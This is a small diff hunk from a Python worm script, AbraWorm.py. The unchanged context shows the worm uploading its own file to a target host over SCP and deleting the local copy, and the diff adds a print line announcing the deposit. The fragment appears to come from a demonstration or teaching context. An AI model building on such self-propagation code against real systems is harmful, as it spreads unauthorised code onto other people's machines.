@@ -146,6 +146,7 @@ while True:
                     file.writelines(all_lines)
                     file.close()
                     scpcon.put('AbraWorm.py')
+                    print("\n\nAbraWorm.py deposited at the target host\n")
                     scpcon.close()
                     os.remove('AbraWorm.py')
                 except:
